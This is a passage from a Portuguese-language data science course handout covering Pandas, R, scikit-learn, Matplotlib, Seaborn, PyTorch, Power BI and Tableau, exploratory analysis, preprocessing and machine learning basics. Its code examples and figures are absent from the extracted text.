especializadas. Com bibliotecas como NumPy, Pandas, Matplotlib e Scikit-learn, 
Videoaula do tópico disponível no AVA: 
Videoaula 6: Principais tecnologias e linguagens utilizadas em Ciência de Dados. 

 
 
os cientistas de dados podem realizar desde tarefas básicas de manipulação de 
dados até algoritmos complexos de aprendizado de máquinas. 
Por exemplo, abaixo está um código simples que carrega um conjunto de dados 
CSV usando Pandas e mostra o dataframe. 
O arquivo csv teria a seguinte estrutura: 
 
Id,titulo,ano,genero 
1,Toy Story,1995,Aventura 
2,Jumanji,1995,Aventura 
3,Grumpier Old Men,1995,Comédia 
4,Waiting to Exhale,1995,Comédia 
5,Father of the Bride Part II,1995,Comédia 
6,Heat,1995,Ação 
7,Sabrina,1995,Comédia 
8,Tom and Huck,1995,Aventura 
9,Sudden Death,1995,Ação 
10,GoldenEye,1995,Ação 
O código faz a importação do Pandas e a leitura do arquivo, gerando a partir dos 
dados um Dataframe que é impresso. 
 
O resultado da impressão do dataframe é: 

 
 
 
O Pandas é uma biblioteca poderosa para manipulação dados cuja principal 
estrutura de dados é chamada de DataFrame que é fácil de usar e adequada 
para áreas que dependem muito de dados. 
 
 
Aprenda Mais:  
Análise 
de 
Dados 
com 
Python 
e 
Pandas. 
Disponível 
em: 
https://www.kaggle.com/code/joaoavf/introducao-a-analise-de-dados-python-e-
pandas 
Pandas 
User 
Guide. 
Disponível 
em: 
https://pandas.pydata.org/docs/user_guide/index.html 
 
2.2.2 Linguagem R 
R é outra linguagem popular entre os cientistas de dados, especialmente na 
comunidade acadêmica. Ele oferece uma ampla gama de pacotes estatísticos e 
ferramentas de visualização que facilitam a análise exploratória de dados e a 
criação de gráficos informativos. Abaixo está um exemplo de como usar R para 
criar um gráfico de dispersão simples: 
 
 

 
 
2.3 Exemplos de Frameworks: Scikit-learn, Matplotlib, Seaborn e PyTorch 
 
2.2.3.1 scikit-learn 
O scikit-learn, muitas vezes abreviado como sklearn, é uma biblioteca em Python 
amplamente utilizada para aprendizado de máquina. Ela oferece diversos 
algoritmos de aprendizado de máquina, bem como ferramentas para pré-
processamento de dados, seleção de modelos, validação e avaliação de 
desempenho. A biblioteca é construída sobre outras bibliotecas populares, como 
NumPy, SciPy e matplotlib. 
Vamos a um exemplo simples. Quando vamos construir um modelo de machine 
learning, por exemplo, para calcular a previsão de vendas do próximo semestre, 
é importante antes padronizar os dados. Padronizar os dados é um processo 
comum no pré-processamento de dados cujo objetivo é colocar as variáveis em 
uma escala comum, tornando-as comparáveis. Um método comum de 
padronização é a padronização Z-score, que transforma os dados para que eles 
tenham uma média de zero e um desvio padrão de um.  
O código abaixo é um exemplo simples de como poderíamos usar a biblioteca 
scikit-learn para nos ajudar nisso. Neste código, estamos usando a classe 
StandardScaler do módulo sklearn.preprocessing para padronizar os dados = 
[[3, 56], [12, 45], [34, 45], [56, 8]] 
 
Assim, os dados que realmente seriam usados para treinar o modelo de machine 
learning seriam os dados_alterados = [[-1.13154094, 0.9629786], [-0.69352509, 
0.35767777], [0.37718031, 0.35767777], [1.44788572, -1.67833413]] 
Videoaula do tópico disponível no AVA: 
Videoaula 7 Exemplos de Frameworks: Scikit-learn, Matplolib, Seaborn e PyTorch. 

 
 
Padronizar os dados antes de alimentá-los a um modelo de machine learning é 
importante por várias razões, entre elas, manter a uniformidade de escala, pois 
algoritmos de machine learning podem ter desempenho inferior quando os dados 
têm escalas muito diferentes; facilitar a interpretação dos coeficientes, uma vez 
que, modelos lineares, como regressão linear ou regressão logística, a 
interpretação dos coeficientes é mais fácil quando os dados estão padronizados; 
além de,  assegurar o desempenho do modelo, em geral, o desempenho de 
muitos algoritmos de machine learning pode ser melhorado ao padronizar os 
dados. 
A padronização é apenas umas das funcionalidades presentes no scikit-learn, 
mais informações estão no site oficial: https://scikit-learn.org/stable/index.html. 
Utilizaremos muito essa biblioteca no curso. 
2.2.3.2 Matplotlib e Seaborn 
Imagine que você quer desenhar um gráfico ou plotar dados em um papel. Você 
pegaria um lápis ou caneta e começaria a desenhar pontos, linhas ou barras 
para representar seus dados. Matplotlib ou o Seaborn são como essa caneta ou 
lápis, mas para o mundo digital. Matplotlib e Seaborn são bibliotecas de 
visualização de dados que permitem criar gráficos e plots estilizados.  
Matplotlib é uma biblioteca de visualização de dados em Python. Ela permite que 
você crie gráficos e plots de maneira fácil e flexível. Com o Matplotlib, você pode 
fazer todos os tipos de visualizações, desde simples gráficos de linha até gráficos 
3D complexos. Ele é muito útil para explorar dados, comunicar resultados e 
entender padrões nos dados. 
Abaixo está um exemplo simples de como usar Matplotlib para criar um gráfico 
de barras a partir de dados gerados randomicamente: 
 

 
 
 
Agora, imagine que você quer tornar esses gráficos e plots ainda mais bonitos e 
atraentes, mas sem muita complicação. É aí que o Seaborn entra em cena. 
Seaborn é uma biblioteca de visualização de dados construída sobre o 
Matplotlib. Ele oferece uma interface de alto nível para criar gráficos estilizados 
com apenas algumas linhas de código. O Seaborn vem com uma variedade de 
temas e paletas de cores predefinidos que tornam fácil criar visualizações 
atraentes sem precisar se preocupar muito com os detalhes de design. Além 
disso, o Seaborn também possui funções especializadas para visualizar 
relacionamentos estatísticos complexos entre variáveis. 
Agora para o mesmo conjunto de dados um gráfico usando a biblioteca Seaborn. 
 
 
Exercício proposto: 

 
 
Utilize os dados de um conjunto de vendas de uma loja online para criar 
visualizações utilizando as bibliotecas Matplotlib e Seaborn. O objetivo é 
entender melhor o desempenho de vendas ao longo do tempo e explorar 
possíveis tendências. 
 Monte o CSV sales_data.csv , utilizando algum editor te textos, com os 
dados abaixo. No Python, carregue os dados de vendas. 
Data,Vendas,Num_Produtos,Preco_Medio 
2023-01-01,500,50,10 
2023-02-01,600,55,11 
2023-03-01,700,60,11.5 
2023-04-01,800,65,12 
2023-05-01,900,70,12.5 
2023-06-01,1000,75,13 
2023-07-01,1100,80,13.5 
2023-08-01,1200,85,14 
2023-09-01,1300,90,14.5 
2023-10-01,1400,95,15 
 Pesquise como utilizar o Matplotlib para criar um gráfico de linha 
mostrando a tendência de vendas ao longo do tempo. 
 Pesquise como utilizar o Seaborn para criar um gráfico de dispersão 
mostrando a relação entre o número de produtos vendidos e o preço 
médio dos produtos. 
 Interprete os insights obtidos a partir das visualizações. 
Possível resposta: 

 
 
 
 
4. Interpretação dos insights 
O gráfico de linha mostra uma tendência crescente nas vendas ao longo do 
tempo. O gráfico de dispersão mostra uma correlação positiva entre o número 
de produtos vendidos e o preço médio dos produtos. Isso sugere que, à medida 
que o número de produtos vendidos aumenta, o preço médio dos produtos 
também tende a aumentar. 

 
 
2.2.3.3 PyTorch 
PyTorch é uma biblioteca de aprendizado de máquina de código aberto que 
facilita a criação e treinamento de modelos de deep learning. 
Imagine que você está ensinando um computador a realizar uma tarefa 
específica, como reconhecer gatos em fotos. Você precisa fornecer ao 
computador muitas fotos de gatos e dizer a ele quais são gatos e quais não são. 
Mas como o computador realmente aprende a reconhecer os gatos? Aqui é onde 
entra o PyTorch. 
PyTorch é como uma caixa de ferramentas que torna mais fácil ensinar 
computadores a aprenderem sozinhos. Ele é uma biblioteca de código aberto 
para aprendizado de máquina, especialmente para deep learning. Deep learning 
é uma forma avançada de aprendizado de máquina inspirada no funcionamento 
do cérebro humano. Com o PyTorch, você pode construir e treinar modelos de 
deep learning. Esses modelos podem aprender a reconhecer padrões 
complexos nos dados, como rostos em fotos ou padrões em séries temporais. O 
PyTorch simplifica muito o processo de construção e treinamento desses 
modelos.  
Em resumo, o PyTorch é uma ferramenta poderosa que permite aos 
pesquisadores e desenvolvedores explorar e experimentar com técnicas de deep 
learning de uma maneira acessível e eficiente, ajudando a impulsionar avanços 
significativos em áreas como visão computacional, processamento de linguagem 
natural e muito mais. 
É importante ressaltar que o PyTorch não é a única biblioteca disponível para 
deep learning. Existem outras bibliotecas como o TensorFlow, Keras ou MXNet. 
Teremos uma disciplina apenas para ensinar redes neurais. 
 
Fonte: https://www.guru99.com/pt/deep-learning-libraries.html 

 
 
Aprenda Mais:  
Melhores bibliotecas de Machine e Deep Learning. Disponível em: 
https://itforum.com.br/noticias/melhores-bibliotecas-de-machine-e-deep-
learning/ 
 
2.4 Ferramentas de Análise de Dados 
O sonho de todo gestor é parar de acessar diferentes ferramentas para gerar 
relatórios, exportar planilhas e compilar dados manualmente. Com a evolução 
das tecnologias de Business Intelligence (BI), esse sonho se tornou realidade. 
A implementação de soluções de BI em estruturas de dados complexas permite 
integrar, analisar e visualizar informações de maneira eficiente, simplificando a 
gestão. 
Um dos principais componentes dessas soluções é o dashboard, um painel 
visual que reúne informações, métricas e indicadores essenciais para o negócio. 
Com um dashboard bem estruturado, os gestores podem: 
 
Visualizar indicadores e métricas de forma objetiva e clara, sem a 
necessidade de manipular múltiplas fontes de dados. 
 
Embasar a tomada de decisões com base em dados atualizados e 
precisos, aumentando a assertividade estratégica. 
 
Acompanhar o desempenho da empresa em tempo real, permitindo 
ajustes rápidos e informados. 
 
Facilitar o monitoramento de dados, garantindo que todas as áreas da 
empresa estejam alinhadas com as metas e objetivos estratégicos. 
Com essas funcionalidades, o BI se torna um aliado na condução dos negócios, 
permitindo que os gestores se concentrem na estratégia, ao invés de perder 
tempo com tarefas operacionais repetitivas. 

 
 
 
Fonte: https://www.site.moki.com.br/post/dashboard-o-que-e 
 
2.4.1 Tableau, PowerBI e outros frameworks 
Tableau e PowerBI são ferramentas de visualização de dados que permitem criar 
dashboards interativos e relatórios dinâmicos a partir de diversas fontes de 
dados. Eles oferecem uma ampla gama de opções de gráficos e filtros para 
explorar e comunicar insights de forma eficaz.  
 
Fonte: https://learn.microsoft.com/pt-br/power-apps/user/interactive-dashboards 
Com o Power BI, os usuários podem criar painéis personalizados e relatórios 
dinâmicos. A ferramenta oferece várias opções de visualização, como gráficos 

 
 
de barras, linhas, pizza e mapas, além de recursos avançados como filtros 
interativos, segmentações e drill-downs. Isso permite que os usuários explorem 
os dados de diferentes perspectivas e identifiquem padrões e tendências 
importantes. 
Outra vantagem do Power BI é sua facilidade de uso e acessibilidade. Com uma 
interface intuitiva e recursos de arrastar e soltar, os usuários podem criar 
relatórios e painéis sem a necessidade de habilidades de programação 
avançadas. Além disso, o Power BI oferece recursos de compartilhamento e 
colaboração que permitem aos usuários compartilhar relatórios e insights com 
colegas de equipe e partes interessadas, tanto dentro quanto fora da 
organização. 
 
Aprenda Mais:  
Visita Guiada Power BI Disponível em: https://powerbi.microsoft.com/pt-
br/guidedtour/power-platform/power-bi/1/1 
 
Tableau é uma plataforma líder em visualização de dados e análise visual, 
projetada para ajudar indivíduos e organizações a entender e comunicar insights 
complexos de dados de forma eficaz. Com uma interface intuitiva e poderosas 
capacidades de visualização, o Tableau permite que os usuários criem painéis 
interativos, dashboards e relatórios dinâmicos a partir de uma ampla variedade 
de fontes de dados.  
Uma das características distintivas do Tableau é sua abordagem baseada em 
arrastar e soltar, que simplifica o processo de criação de visualizações 
complexas sem a necessidade de habilidades de programação avançadas. Os 
usuários podem escolher entre uma variedade de tipos de gráficos, incluindo 
barras, linhas, dispersões, mapas e muito mais, e personalizá-los de acordo com 
suas necessidades específicas. Além disso, o Tableau oferece recursos 
avançados, como filtros interativos, ações, cálculos personalizados e previsões, 
que permitem uma análise mais aprofundada dos dados. 
 
 

 
 
UNIDADE 3 EXPLORAÇÂO E ANÁLISE DE DADOS 
 
OBJETIVOS DA UNIDADE 3  
Ao final dos estudos, você deverá ser capaz de:  Compreender o processo 
de exploração e análise de dados, desde a coleta inicial até a interpretação dos 
resultados 
finais, 
reconhecendo 
a 
importância 
de 
cada 
etapa 
no 
desenvolvimento de insights significativos. 
 
 
 
 

 
 
3.1 Processo de exploração e análise de dados 
 
O processo de exploração e análise de dados é um estágio fundamental em data 
science, no qual os profissionais buscam compreender os conjuntos de dados 
que estão sendo analisados. Este processo geralmente começa com a coleta de 
dados brutos de diversas fontes, seguido pela sua limpeza e transformação. Esta 
fase é iterativa, onde os dados são explorados repetidamente à medida que 
novas informações são descobertas. 
Durante a exploração dos dados, os cientistas de dados utilizam uma variedade 
de técnicas estatísticas e algoritmos para identificar padrões, tendências e 
possíveis anomalias nos dados.  Os cientistas de dados têm à sua disposição 
várias técnicas para explorar e analisar dados, entre elas destacamos a Análise 
Descritiva e a Análise Exploratória de Dados (EDA), que são pontos de partida 
do trabalho. 
 Análise Descritiva: A análise descritiva de dados é uma etapa inicial e 
introdutória da análise de dados. Esta técnica envolve a descrição básica 
dos dados. Para entender e descrever os dados o cientista ou analista de 
dados calcula médias, medianas, desvios padrão, percentis, produz 
visualizações básicas, como histogramas e gráficos de dispersão. Isso 
tudo na tentativa de resumir e visualizar as características básicas dos 
dados, procurando insights iniciais que podem orientar análises mais 
avançadas. 
 Análise Exploratória de Dados (EDA): EDA procura examinar um 
problema, procurando por diferentes possibilidades e pontos de vista. 
Além das técnicas da própria análise descritiva, a EDA pode incluir, por 
exemplo, traçar correlações primárias entre diferentes conjuntos e 
variáveis. Envolve a criação de Matrizes de Correlação, Análise de 
Outliers, Visualizações Interativas ou Técnicas de Redução de 
Dimensionalidade. 
A análise descritiva e exploratória de dados são partes integrantes de um mesmo 
processo de compreensão inicial e investigação. Embora frequentemente 
empregadas em conjunto, especialmente em análises quantitativas, essas 
abordagens não são idênticas. Enquanto a análise descritiva busca resumir fatos 
e identificar tendências, padrões e anomalias nos dados, a análise exploratória 
vai além, estabelecendo conexões, agrupamentos e correlações entre os dados, 
permitindo a geração de novos insights e entendimentos sobre o cenário 
Videoaula do tópico disponível no AVA: 
Videoaula 9: Processo de exploração e análise de dados. 

 
 
retratado. Mas, é importante destacar que uma compreensão sólida do processo 
de exploração de dados é essencial para garantir que as análises subsequentes 
sejam precisas e significativas. 
Vamos fazer um exercício. O exemplo de código abaixo mostra uma análise 
descritiva e uma análise exploratório de um conjunto fictício de dados. Na 
sequencia apresentamos um possível relatório que seria apresentado ao gestor. 
 
Depois de carregar os dados, podemos explorá-los usando métodos como 
describe() para obter estatísticas descritivas e info() para informações sobre os 
tipos de dados e valores ausentes. No exemplo usamos o describe(). 
 
 
A análise descritiva revelou que a média de idade dos funcionários é de 
aproximadamente 60 anos, com um desvio padrão de 50 anos, indicando uma 
dispersão significativa dos dados. 

 
 
Em relação aos salários, observamos uma média de R$ 5250, com um desvio 
padrão de R$ 1513, evidenciando certa variabilidade nos ganhos dos 
colaboradores. 
No entanto, identificamos uma anomalia na idade de um dos funcionários, que 
apresentou uma idade máxima registrada como 200 anos. Esta é uma 
discrepância significativa em relação às demais idades e pode indicar um erro 
de digitação ou coleta dos dados. 
 
A correlação entre idade e salário foi calculada, revelando uma relação forte 
entre as duas variáveis (correlação de aproximadamente 0.70). 
Ao analisarmos a distribuição de idade dos funcionários, notamos que a maioria 
está concentrada em faixas etárias mais baixas, com poucos funcionários acima 
dos 60 anos. 
Para uma análise mais detalhada, agrupamos os funcionários em faixas etárias 
e calculamos a média de salário para cada faixa. Os resultados mostram uma 
tendência de aumento salarial conforme a faixa etária avança, indicando uma 
possível valorização da experiência e senioridade. 
Claro que não é apenas isso que é feito. Existe um conjunto de técnicas de 
exploração de dados que podem e devem ser usadas para garantir que se 
entenda muito bem as características dos dados e quais procedimentos de 
limpeza são necessários. Cabe ao cientista ou analista de dados escolher as 
técnicas apropriadas. 

 
 
 
 
Aprenda Mais:   
Quais são os tipos de análise de dados e como aplicá-los para obter 
respostas mais precisas? Disponível em: https://niteolearning.com/blog/tipos-
de-analise-de-dados-quais-sao-quando-como-aplicar/ 
 
3.2 Métodos de visualização de dados e sua importância na análise exploratória 
Os métodos de visualização de dados desempenham um papel importante na 
análise exploratória, pois permitem que os cientistas de dados representem 
graficamente os padrões e relações presentes nos dados. Gráficos como 
histogramas, gráficos de dispersão e box plots são ferramentas comuns 
utilizadas para explorar a distribuição dos dados e identificar possíveis outliers. 
Por exemplo, ao utilizar um histograma, podemos visualizar a distribuição dos 
dados em intervalos, o que nos ajuda a entender a frequência de ocorrência de 
diferentes valores em uma variável. Da mesma forma, um gráfico de dispersão 
nos permite identificar relações entre duas variáveis, como correlações positivas 
ou negativas. 
 
Fonte: https://blog.somostera.com/data-science/visualizacao-de-dados 

 
 
Além dos gráficos básicos, existem visualizações mais avançadas que podem 
revelar insights complexos em conjuntos de dados multidimensionais. Por 
exemplo, mapas de calor são úteis para representar a densidade ou intensidade 
de uma variável em diferentes regiões de um espaço bidimensional. Já os 
gráficos de rede podem ser empregados para visualizar conexões e 
relacionamentos entre entidades em um conjunto de dados, como redes sociais 
ou redes de coautoria em artigos acadêmicos. 
A visualização de dados não só facilita a compreensão dos dados, mas também 
ajuda na identificação de padrões ocultos que podem não ser evidentes apenas 
olhando para os números. Por exemplo, ao plotar um gráfico de dispersão e 
aplicar uma linha de tendência, podemos identificar padrões de crescimento ou 
decrescimento em uma série temporal. Esses padrões podem fornecer insights 
valiosos para tomar decisões informadas em diferentes domínios, como 
finanças, marketing ou saúde. 
Além disso, as visualizações de dados são uma ferramenta poderosa para 
comunicar resultados para stakeholders não técnicos. Gráficos claros e intuitivos 
podem ajudar a transmitir informações complexas de forma compreensível, 
facilitando a tomada de decisões estratégicas. Portanto, investir em técnicas de 
visualização de dados é fundamental para uma análise exploratória eficaz, pois 
ajuda os cientistas de dados a extrair insights significativos e a comunicá-los de 
maneira eficaz para diferentes audiências. 
Abaixo temos alguns exemplos simples de visualizações de dados em Python. 
Existem muitas outras opções e personalizações disponíveis em bibliotecas como 
Matplotlib, Seaborn, Plotly, entre outras, para explorar e representar graficamente 
os dados de maneira eficaz e informativa. 
 
 

 
 
 
A análise que fizemos na seção anterior poderia ser melhorada acrescentando 
gráficos para identificar padrões e tendências nos dados. 
 
 
 

 
 
 
3.3 Técnicas de pré-processamento de dados 
 
O pré-processamento de dados é uma etapa crítica na preparação dos dados 
para análise. Envolve uma série de técnicas, incluindo limpeza de dados para 
remover valores ausentes ou inconsistentes, normalização para garantir que 
todas as variáveis tenham a mesma escala e transformações para tornar os 
dados mais adequados para modelos de análise específicos. 
Um pré-processamento de dados eficaz é fundamental para garantir que os 
resultados da análise sejam confiáveis e significativos, evitando conclusões 
errôneas ou enviesadas devido a dados mal preparados.  
Uma das técnicas mais comuns é a limpeza de dados, que visa remover valores 
ausentes, inconsistentes ou duplicados que podem distorcer os resultados da 
análise. Por exemplo, podemos usar o método dropna() em Pandas para 
remover linhas ou colunas com valores ausentes em um DataFrame do Python. 
No próximo exemplo, criamos um conjunto de dados aleatórios contendo 100 
registros e 5 colunas. Para simular dados ausentes, introduzimos valores NaN 
(não numéricos) em algumas células aleatórias das colunas 'A' e 'B'. Em seguida, 
realizamos uma etapa de pré-processamento para lidar com esses dados 
ausentes. Utilizamos o método dropna() da biblioteca pandas para eliminar todas 
as linhas que contenham pelo menos um valor NaN. Isso resultou em um 
conjunto de dados limpo, sem valores ausentes, pronto para análise posterior.  
Videoaula do tópico disponível no AVA: 
Videoaula 11: Técnicas de pré-processamento de dados. 

 
 
 
 
Outra técnica importante é a normalização, que é utilizada para garantir que 
todas as variáveis tenham a mesma escala. Isso é especialmente importante em 
algoritmos de machine learning que são sensíveis à escala das variáveis. O 
scikit-learn, por exemplo, oferece uma classe chamada MinMaxScaler para 
realizar a normalização de dados. 
 
Além disso, as técnicas de redução de dimensionalidade, como a Análise de 
Componentes Principais (PCA), são frequentemente aplicadas para lidar com 
conjuntos de dados de alta dimensionalidade. Isso pode ajudar a reduzir a 
complexidade dos dados, preservando ao mesmo tempo as informações mais 
relevantes. Por exemplo, podemos usar o PCA para reduzir um conjunto de dados 

 
 
de alta dimensionalidade para duas dimensões, facilitando a visualização e a 
análise. 
 
Esses são apenas alguns exemplos de técnicas que poderiam ser utilizadas para 
realizar o pré-processamento e evitar conclusões errôneas ou enviesadas devido 
a dados mal preparados. 
3.4 Importância da interpretação dos resultados na análise de dados 
 
A interpretação dos resultados na análise de dados envolve compreender não 
apenas os resultados estatísticos, mas também o contexto em que foram obtidos 
e as possíveis limitações dos dados e das análises realizadas. Habilidades de 
comunicação são essenciais para transmitir esses resultados de forma clara e 
compreensível para stakeholders não técnicos. Uma interpretação cuidadosa 
dos resultados ajuda a evitar conclusões precipitadas ou interpretações 
errôneas, garantindo que as decisões baseadas em dados sejam sólidas e 
confiáveis.  
 
 
 
Videoaula do tópico disponível no AVA: 
Videoaula 12: Treinamento do modelo 

 
 
UNIDADE 4 MODELAGEM E APRENDIZAGEM DE MÁQUINA 
 
OBJETIVOS DA UNIDADE 4  
Ao final dos estudos, você deverá ser capaz de: Compreender os conceitos 
fundamentais de modelagem e aprendizado de máquina, bem como a 
importância da escolha adequada do algoritmo para cada problema específico.  
 
 
 

 
 
4.1 Conceitos básicos de modelagem e aprendizado de máquina 
 
Imagine que você tem uma grande pilha de dados sobre vendas de uma loja. 
Você deseja entender melhor esses dados para prever as vendas futuras ou 
identificar padrões de compra dos clientes. Aqui é onde entra a modelagem e o 
aprendizado de máquina. 
Modelagem e aprendizado de máquina são como a caixa de ferramentas que os 
cientistas de dados usam para extrair informações valiosas de dados complexos. 
Um modelo de aprendizado de máquina é a representação matemática ou 
computacional do nosso problema. É como uma fórmula matemática que 
aprende com os dados de treinamento para fazer previsões ou tomar decisões. 
Por exemplo, um modelo de aprendizado de máquina pode aprender com os 
dados históricos de vendas para prever quantas vendas você pode esperar em 
um determinado dia da semana ou temporada do ano. 
Para treinar um modelo de aprendizado de máquina são necessários muitos 
dados.  Esses dados são divididos em dados de teste e dados de treinamento.  
Para serem usados os todos os dados precisam ter passado pela fase de pré-
processamento. 
Os dados de treinamento são a base fundamental para o desenvolvimento e 
treinamento de modelos de aprendizado de máquina. Eles consistem em um 
conjunto de exemplos que são usados para ensinar o modelo a fazer previsões 
ou tomar decisões com base nos padrões presentes nos dados. 
O papel dos dados de treinamento é essencialmente ensinar o modelo a 
aprender a partir de exemplos passados, para que possa generalizar e fazer 
previsões precisas sobre novos dados no futuro. Imagine que você está 
treinando um modelo para reconhecer cães em fotos. Seus dados de 
treinamento seriam imagens de cães previamente rotuladas como "cães", junto 
com outras imagens de coisas que não são cães, como "gatos", "carros", 
"árvores", etc. Ao expor o modelo a esses exemplos variados, ele aprende a 
identificar padrões visuais que são comuns a imagens de cães e a distinguir cães 
de outras coisas. 
Videoaula do tópico disponível no AVA: 
Videoaula 13: Conceitos básicos de modelagem e aprendizado de máquina. 

 
 
 
Fonte: 
https://tatianaesc.medium.com/machine-learning-conceitos-e-modelos-
f0373bf4f445 
A figura acima criada por Escovedo mostra o esquema de treinamento de uma 
modelo de classificação a autora sugere que “a base de treino é submetida ao 
modelo (classificador) para que seus parâmetros sejam calibrados de acordo 
com os dados apresentados. Após esta etapa, ocorre a etapa de predição de 
classes: os exemplos da base de teste são apresentados para o modelo treinado 
para que este realize a predição de suas classes”. Podemos perceber que os 
dados de treinamento são usados para treinar e construir um modelo genérico e 
os dados de testes são usados para testar se a eficiência pretendida para o 
modelo foi atingida. 
Sem dados de treinamento e testes suficientes e representativos, o modelo não 
terá informações suficientes para aprender e não será capaz de fazer previsões 
precisas sobre novos dados. Portanto, a qualidade e a quantidade dos dados de 
treinamento e testes desempenham um papel crucial no sucesso do modelo de 
aprendizado de máquina. 
 
Aprenda Mais:   
Machine Learning: Conceitos e Modelos — Parte I: Aprendizado 
Supervisionado. 
Disponível 
em: 
https://tatianaesc.medium.com/machine-
learning-conceitos-e-modelos-f0373bf4f445 
 

 
 
4.2 Tipos de algoritmos de aprendizado de máquina e suas aplicações 
 
No mundo do aprendizado de máquina, existem diferentes tipos de algoritmos, 
cada um com sua própria maneira de aprender com os dados e fazer previsões. 
São os clássicos:  
 Regressão: É como uma linha de melhor ajuste que tenta prever valores 
contínuos com base em variáveis de entrada. Por exemplo, prever o preço 
de uma casa com base em características como tamanho, número de 
quartos, etc. 
 Classificação: Este tipo de algoritmo é usado quando queremos 
classificar algo em categorias. Por exemplo, identificar se um e-mail é 
spam ou não, com base no texto do e-mail e em outros atributos. 
 Agrupamento: Agrupamento é usado quando queremos encontrar 
padrões nos dados sem ter rótulos explícitos. Por exemplo, agrupar 
clientes com base em padrões de compra semelhantes, como fazemos 
em uma loja online. 
 Aprendizado Profundo: Este tipo de aprendizado de máquina é 
inspirado no funcionamento do cérebro humano e é usado para lidar com 
dados complexos, como imagens, áudio e texto. Redes neurais profundas 
são um exemplo disso. 
 
4.3 Avaliação de modelos de aprendizado de máquina 
 
Imagine que você treinou um modelo para identificar padrões de compra dos 
clientes, e sempre que você fornece dados de um novo cliente ele prevê o padrão 
de compra, mas como você sabe se ele está funcionando corretamente? É aqui 
que a avaliação de modelos entra em cena. Depois de treinar um modelo com 
os dados de treinamento, é importante entender como ele se comporta e quão 
confiável é em fazer previsões ou tomar decisões. 
Isso é feito executando o modelo com os dados de testes, que ainda não são 
conhecidos do modelo. As respostas preditas pelo modelo são comparadas com 
Videoaula do tópico disponível no AVA: 
Videoaula 14: Tipos de algoritmos de aprendizado de máquina e suas aplicações. 
Videoaula do tópico disponível no AVA: 
Videoaula 15: Avaliação de modelos de aprendizado de máquina. 

 
 
as respostas corretas dos dados de teste, e então calculado métricas de definem 
o quanto o modelo acertou. 
A importância da avaliação do modelo reside no fato de que ela nos permite 
entender a eficácia e a capacidade de generalização do modelo. Em outras 
palavras, ela nos ajuda a responder à pergunta: "O quão bem o modelo está 
realizando suas previsões ou tomadas de decisão em dados que não foram 
vistos durante o treinamento?" 
Ao avaliar um modelo, podemos determinar se ele está sofrendo de overfitting 
(ajuste excessivo aos dados de treinamento), underfitting (não sendo capaz de 
capturar a complexidade dos dados) ou se está funcionando de forma ideal para 
o problema em questão. 
Além disso, a avaliação do modelo nos ajuda a comparar diferentes modelos e 
escolher o mais adequado para a tarefa em mãos. Por exemplo, podemos 
comparar o desempenho de diferentes algoritmos ou ajustar os parâmetros de 
um único algoritmo para melhorar seu desempenho. 
4.4 Desafios e limitações do aprendizado de máquina 
Embora o aprendizado de máquina seja incrivelmente poderoso, ele também 
enfrenta alguns desafios importantes: 
 Interpretabilidade: Modelos complexos, como redes neurais, podem ser 
como "caixas-pretas", difíceis de entender. Isso pode ser problemático em 
situações em que precisamos explicar as decisões do modelo. 
 Viés e Discriminação: Modelos de aprendizado de máquina podem 
refletir e até amplificar viés e discriminação presentes nos dados de 
treinamento. Isso pode levar a decisões injustas ou prejudiciais. 
 Escassez de Dados: Algoritmos de aprendizado de máquina geralmente 
precisam de muitos dados para funcionar bem. A falta de dados pode 
levar a modelos que não generalizam bem para novas situações. 
 Overfitting e Underfitting: Estes são problemas comuns em que nosso 
modelo se ajusta muito bem ou muito mal aos dados de treinamento, 
respectivamente, tornando-se incapaz de generalizar para novos dados. 
 Custo Computacional: Algoritmos complexos, como redes neurais 
profundas, 
podem 
exigir 
muitos 
recursos 
computacionais 
para 
treinamento e inferência, tornando-os caros em termos de tempo e 
hardware. 
Estes são apenas alguns dos desafios que os cientistas de dados enfrentam ao 
trabalhar com aprendizado de máquina. Navegar por esses desafios requer uma 
abordagem cuidadosa e ética, além de um entendimento sólido dos conceitos e 
técnicas subjacentes. 

 
 
Compreender esses tópicos fundamentais é essencial para qualquer pessoa 
interessada em explorar o mundo emocionante da modelagem e do aprendizado 
de máquina. Ao dominar esses conceitos, você estará preparado para enfrentar 
uma variedade de problemas do mundo real e construir soluções inteligentes e 
eficazes.  
 
 

 
 
UNIDADE 5 TÓPICOS AVANÇADOS E TENDÊNCIAS EM CIÊNCIA 
DE DADOS 
 
OBJETIVOS DA UNIDADE 5  
Ao final dos estudos, você deverá ser capaz de: Explorar Redes Neurais,  
Deep Learning, Visão Computacional, Processamento de Linguagem Natural 
(NLP) e Modelos Generativos compreendendo os princípios fundamentais por 
trás dessas técnicas e sua aplicação em problemas complexos de modelagem e 
predição. 
 
 
 

 
 
5.1 Redes Neurais e Deep Learning 
As redes neurais e o deep learning são tecnologias que têm revolucionado a 
forma como lidamos com dados complexos, especialmente em áreas como 
reconhecimento de padrões, processamento de linguagem natural e visão 
computacional. Uma rede neural é um modelo matemático inspirado no 
funcionamento do cérebro humano, composto por camadas de neurônios 
interconectados.  
O deep learning, por sua vez, refere-se ao treinamento de redes neurais com 
muitas camadas, permitindo que elas aprendam representações de dados cada 
vez mais abstratas e complexas. 
Exemplo: Um exemplo prático de aplicação de redes neurais e deep learning é 
o reconhecimento de voz por assistentes virtuais como o Siri da Apple ou o 
Google Assistant. Esses sistemas utilizam modelos de deep learning para 
interpretar e responder aos comandos dos usuários com precisão 
impressionante. 
5.2 Visão Computacional 
A visão computacional é uma área da ciência de dados que se concentra em 
capacitar os computadores a entenderem e interpretarem o mundo visual, de 
maneira semelhante ao cérebro humano. Isso envolve técnicas como detecção 
de objetos, reconhecimento facial, segmentação de imagens e muito mais. 
Exemplo: Um exemplo de aplicação de visão computacional é a tecnologia de 
reconhecimento facial utilizada em sistemas de segurança e identificação em 
redes sociais, como o Facebook. Esses sistemas são capazes de identificar 
rostos em fotos, facilitando a marcação de amigos e a organização de álbuns. 
 
Fonte: https://lyncas.net/visao-computacional-automatizar-processos/ 

 
 
Aprenda Mais:   
Visão Computacional: 5 aplicações para aprimorar processos Disponível 
em: https://lyncas.net/visao-computacional-automatizar-processos/ 
5.3 Processamento de Linguagem Natural (NLP) 
O processamento de linguagem natural é uma área da ciência de dados que se 
concentra na interação entre computadores e linguagem humana. Isso inclui 
tarefas como tradução automática, análise de sentimentos, geração de texto e 
muito mais. 
Exemplo: Um exemplo de aplicação de processamento de linguagem natural é 
a assistência virtual em serviços de atendimento ao cliente, como os chatbots. 
Esses sistemas utilizam algoritmos de NLP para compreender e responder às 
perguntas dos usuários de forma natural e eficiente. 
 
Fonte: https://lyncas.net/visao-computacional-automatizar-processos/ 
 
Aprenda Mais:   
